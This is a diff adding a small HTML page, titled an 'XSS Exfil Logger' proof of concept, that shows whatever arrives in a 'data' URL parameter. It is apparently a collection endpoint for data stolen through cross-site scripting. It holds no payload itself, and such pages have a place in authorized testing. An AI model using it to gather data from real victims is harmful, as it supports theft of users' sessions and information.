@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Exfil Logger - PoC</title>
+  <style>body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }</style>
+</head>
+<body>
+  <h1>XSS Data Logger (Vercel PoC)</h1>
+  <p>Data exfil akan muncul di bawah ini (refresh halaman untuk update manual).</p>
+  <pre id="log"></pre>
+
+  <script>
+    // Untuk demo: tampilkan dari query string (jika GET)
+    const urlParams = new URLSearchParams(window.location.search);
+    const data = urlParams.get('data');
+    if (data) {
+      document.getElementById('log').textContent += decodeURIComponent(data) + '\n\n';
+    }
+  </script>
+</body>
+</html>
